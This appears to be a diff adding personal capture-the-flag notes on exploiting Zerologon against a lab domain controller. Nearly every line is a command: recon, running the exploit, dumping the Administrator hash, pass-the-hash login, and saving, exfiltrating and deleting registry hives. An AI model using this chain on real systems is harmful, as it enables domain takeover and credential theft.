@@ -1,0 +1,39 @@
+Zerologon is a vulnerability which it resets the DC passwords 
+I've already downloaded cve-2020-1472-exploits.py 
+
+First we do a recon first to find the software version checj for it operating system 
+
+nmap -sC -p135,139,445 -T5 10.10.0.165 
+
+Now run the exploit 
+python3 cve-2020-1472-exploits.py DC1 10.10.0.165
+in which DC1 is the computer name 
+now we use secretsdump to dump out the Administrator login credentials 
+	impacket-secretsdump -no-pass -just-dc-user Administrator 'sandbox.local/DC1$@10.10.0.165' 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:c263e573945cdc50d44f08ad17fd9b52:::
+	
+Now we log in using the hases 
+impacket-wmiexec -hashses aad3b435b51404eeaad3b435b51404ee:c263e573945cdc50d44f08ad17fd9b52 'sandbox.local/Administrator@10.10.0.165 
+
+The flag is in the Administrator's desktop
+
+
+
+Restore password 
+Backup Registry
+reg save HKLM\SYSTEM system.save
+reg save HKLM\SAM sam.save 
+reg save HKLM\SECURITY security.save
+
+Transfer file 
+lget system.save 
+lget sam.save 
+lget security.save
+
+Delete file on target machine
+del /f system.save
+del /f sam.save
+del /f security.save 
+
+impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL 
+
+python3 restorepassword.py sandbox.local/DC1@DC1 -target-ip 10.10.0.165 -hexpass 6b44b83798f1704599a2c558ad5fddd11b8092e1a6c18aca0523db43b6189e46980d79d1cf5d662cbfae83e01aa0421e0155710a6bfa1c2db2b055754f14f5de474e4aed079c099d80ba618b6fd7662e15a4572838a46dc69e10e06b011e9564b119c676579d8b677a89516be95b32158e4a24cfc47a5591d932faac1b8201db2da0dedeea7d8006cafd4f36585eb3b6989b7f5f359633f2e12786d9e49969850a493ccb5b060051482db8a1632f7f38cbc3215a6e6c6a703722d0ef7223bf4f7a20ee61193720969fbf31c728cfe412c8c6705846b4b147c92808cb9eee9b6d34db1071dda06581a53b13a0c18649d7
